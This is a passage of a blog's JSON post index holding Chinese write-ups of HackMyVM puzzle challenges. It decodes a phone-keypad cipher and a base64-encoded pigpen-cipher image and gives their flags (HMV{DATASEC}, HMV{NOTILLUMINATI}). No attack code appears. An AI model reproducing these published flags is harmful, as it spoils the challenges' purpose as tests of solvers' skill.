\u662f\uff1a\n```\nHMV{infrontofme}\n```\nsentence", "top": 0, "createdAt": 1751016586, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P39": {"htmlDir": "docs/post/Challenge 011.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 011", "postUrl": "post/Challenge%20011.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/39", "commentNum": 0, "wordCount": 1890, "description": "# 1. \u521d\u6b65\u5206\u6790\n\n**\u6311\u6218\u94fe\u63a5:** https://hackmyvm.eu/challenges/challenge.php?c=011\n\n![\u6311\u6218\u56fe\u7247](https://7r1umphk.github.io/image/20250518110146012.webp)\n\n## 1. \u521d\u6b65\u5206\u6790\n\n\u6311\u6218\u9875\u9762\u663e\u793a\u4e86\u4e00\u6bb5\u88ab `<pre>` \u6807\u7b7e\u5305\u88f9\u7684\u6587\u672c\uff0c\u8fd9\u901a\u5e38\u610f\u5473\u7740\u5176\u4e2d\u7684\u7a7a\u683c\u548c\u6362\u884c\u7b26\u4f1a\u88ab\u4fdd\u7559\uff0c\u4ee5\u7ef4\u6301\u5176\u539f\u59cb\u683c\u5f0f\u3002\u6587\u672c\u5185\u5bb9\u5982\u4e0b\uff1a\n\n```html\n<pre> $$$$$$$$$$ $_________$$ $_$$$$$$$_$$ $_$_____$_$$ $_$_____$_$$ $_$_____$_$$ $_$_____$_$$ $_$$$$$$$_$$ $_________$$ $$$$$$$$$$ $_________$$ $_1__2__3_$$$ $_4__5__6_$$$ $_7__8__9_$$$ $_*__0__#_$$$ $_________$$$ $$$$$$$$$$$ $$$$$$$$$ FLAG: HMV{?} ? = 3-1 2-1 8-1 2-1 7-4 3-2 2-3 </pre>\n```\n\n\u89c2\u5bdf\u8fd9\u6bb5\u6587\u672c\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u51e0\u4e2a\u5173\u952e\u70b9\uff1a\n1.  \u524d\u534a\u90e8\u5206\u7528 `$` \u548c `_` \u5b57\u7b26\u7ed8\u5236\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u952e\u76d8\u7684\u56fe\u5f62\u3002\n2.  \u7d27\u63a5\u7740\uff0c\u8fd9\u4e2a\u56fe\u5f62\u4e0b\u65b9\u6709\u4e86\u4e00\u4e2a\u66f4\u660e\u786e\u7684\u6570\u5b57\u952e\u76d8\u5e03\u5c40\uff1a\n    ```\n    $_1__2__3_$$$\n    $_4__5__6_$$$\n    $_7__8__9_$$$\n    $_*__0__#_$$$\n    ```\n    \u8fd9\u975e\u5e38\u50cf\u4e00\u4e2a\u6807\u51c6\u7684\u7535\u8bdd\u62e8\u53f7\u952e\u76d8\u3002\n3.  \u6700\u5173\u952e\u7684\u4fe1\u606f\u662f `FLAG: HMV{?} ? = 3-1 2-1 8-1 2-1 7-4 3-2 2-3`\u3002\n    \u8fd9\u8868\u660e\u6211\u4eec\u9700\u8981\u6839\u636e\u7ed9\u51fa\u7684\u5750\u6807 `X-Y` \u6765\u4ece\u7535\u8bdd\u952e\u76d8\u4e0a\u627e\u51fa\u5bf9\u5e94\u7684\u5b57\u7b26\uff0c\u4ee5\u66ff\u6362 `?`\u3002\n\n## 2. \u89e3\u5bc6\u8fc7\u7a0b\n\n\u8fd9\u4e2a\u6311\u6218\u7684\u6838\u5fc3\u662f\u7406\u89e3\u5750\u6807 `X-Y` \u5982\u4f55\u6620\u5c04\u5230\u7535\u8bdd\u952e\u76d8\u4e0a\u7684\u5b57\u7b26\u3002\n\n### 2.1 \u7406\u89e3\u952e\u76d8\u5e03\u5c40\u4e0e\u7f16\u7801\n\n\u6807\u51c6\u7684\u7535\u8bdd\u952e\u76d8\u6309\u952e\u901a\u5e38\u4e0e\u5b57\u6bcd\u76f8\u5173\u8054\uff08\u7528\u4e8e T9 \u8f93\u5165\u7b49\uff09\uff1a\n*   `1`: (\u901a\u5e38\u6ca1\u6709\u5b57\u6bcd\uff0c\u6216\u6709\u7279\u6b8a\u7b26\u53f7)\n*   `2`: `ABC`\n*   `3`: `DEF`\n*   `4`: `GHI`\n*   `5`: `JKL`\n*   `6`: `MNO`\n*   `7`: `PQRS`\n*   `8`: `TUV`\n*   `9`: `WXYZ`\n*   `0`: (\u901a\u5e38\u662f\u7a7a\u683c\u6216 `+`)\n*   `*`, `#`: \u7279\u6b8a\u529f\u80fd\u952e\n\n\u7ed9\u51fa\u7684\u5750\u6807\u683c\u5f0f\u662f `X-Y`\u3002\u6211\u4eec\u53ef\u4ee5\u5408\u7406\u5730\u63a8\u65ad\uff1a\n*   `X` \u4ee3\u8868\u7535\u8bdd\u952e\u76d8\u4e0a\u7684\u6570\u5b57\u952e\u3002\n*   `Y` \u4ee3\u8868\u8be5\u6570\u5b57\u952e\u4e0a\u5bf9\u5e94\u5b57\u6bcd\u5e8f\u5217\u4e2d\u7684\u7b2c `Y` \u4e2a\u5b57\u6bcd\uff081-based index\uff09\u3002\n\n### 2.2 \u5750\u6807\u89e3\u6790\n\n\u73b0\u5728\u6211\u4eec\u6765\u9010\u4e2a\u89e3\u6790\u7ed9\u51fa\u7684\u5750\u6807 `3-1 2-1 8-1 2-1 7-4 3-2 2-3`\uff1a\n\n1.  **`3-1`**:\n    *   \u952e `3` \u5bf9\u5e94\u5b57\u6bcd `DEF`\u3002\n    *   \u7b2c `1` \u4e2a\u5b57\u6bcd\u662f `D`\u3002\n\n2.  **`2-1`**:\n    *   \u952e `2` \u5bf9\u5e94\u5b57\u6bcd `ABC`\u3002\n    *   \u7b2c `1` \u4e2a\u5b57\u6bcd\u662f `A`\u3002\n\n3.  **`8-1`**:\n    *   \u952e `8` \u5bf9\u5e94\u5b57\u6bcd `TUV`\u3002\n    *   \u7b2c `1` \u4e2a\u5b57\u6bcd\u662f `T`\u3002\n\n4.  **`2-1`**:\n    *   \u952e `2` \u5bf9\u5e94\u5b57\u6bcd `ABC`\u3002\n    *   \u7b2c `1` \u4e2a\u5b57\u6bcd\u662f `A`\u3002\n\n5.  **`7-4`**:\n    *   \u952e `7` \u5bf9\u5e94\u5b57\u6bcd `PQRS`\u3002\n    *   \u7b2c `4` \u4e2a\u5b57\u6bcd\u662f `S`\u3002\n\n6.  **`3-2`**:\n    *   \u952e `3` \u5bf9\u5e94\u5b57\u6bcd `DEF`\u3002\n    *   \u7b2c `2` \u4e2a\u5b57\u6bcd\u662f `E`\u3002\n\n7.  **`2-3`**:\n    *   \u952e `2` \u5bf9\u5e94\u5b57\u6bcd `ABC`\u3002\n    *   \u7b2c `3` \u4e2a\u5b57\u6bcd\u662f `C`\u3002\n\n### 2.3 \u7ec4\u5408\u89e3\u5bc6\u5b57\u7b26\n\n\u5c06\u89e3\u6790\u51fa\u6765\u7684\u5b57\u6bcd\u7ec4\u5408\u8d77\u6765\uff0c\u5f97\u5230\uff1a`D A T A S E C`\u3002\n\n## 3. \u83b7\u53d6 Flag\n\n\u5c06\u4e0a\u9762\u89e3\u5bc6\u5f97\u5230\u7684\u5b57\u7b26\u4e32 `DATASEC` \u66ff\u6362\u6389 `FLAG: HMV{?}` \u4e2d\u7684 `?`\u3002\n\n## 4. Flag\n\n\u6700\u7ec8\u7684 Flag \u662f\uff1a\n```\nHMV{DATASEC}\n```\nsentence", "top": 0, "createdAt": 1751016588, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P40": {"htmlDir": "docs/post/Challenge 049.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 049", "postUrl": "post/Challenge%20049.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/40", "commentNum": 0, "wordCount": 12167, "description": "![image-20250621130059885](https://7r1umphk.github.io/image/20250621130100186.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 049.zip \nArchive:  049.zip\n  inflating: ourobouros              \n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat ourobouros\n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\nz4oUKaKB/fuq4+vt5eHhYcfuADiDYsV8FDphrLp06qDxoZP04Ucf/3Vb3Tq1DQ+aBOB4fHx81Ltn\nd02dPvOvn5Ut+6hGBgepXt1X7NgZcostg7G/MFHvfgO0a/cehjoCMN2OXbs1IXSSTpw4qYS4DXqs\nfHl7twQgD1y/fl11X22olJQUhjo6IcIKTHX69BmlpKYy1BFAnkhNTdWnBz9TrZo17N0KgDx0+PCX\nKlv2UYY6OiHCCgAAAABL4gv2AAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIA\nAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJ\nsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAA\nACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggr\nAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADA\nkv4fmdy7yXs3RecAAAAASUVORK5CYII=\n\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat ourobouros|base64 -d > our\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll our\n-rwxr-xr-x 1 kali kali 7775 Jun 21 01:02 our\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ file our                               \nour: PNG image data, 811 x 137, 8-bit/color RGBA, non-interlaced\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ mv our our.png\n                                  \n```\n\n![our](https://7r1umphk.github.io/image/20250621130302644.webp)\n\ngoogle\u4e00\u4e0b\n\n![image-20250621130351324](https://7r1umphk.github.io/image/20250621130351621.webp)\n\nhttps://www.dcode.fr/pigpen-cipher\n\n![image-20250621130909609](https://7r1umphk.github.io/image/20250621130910070.webp)\n\n\u7b2c\u4e00\u4e2a\n\n```\nHMV{NOTILLUMINATI}\n```\n\nsentence", "top": 0, "createdAt": 1751016591, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": 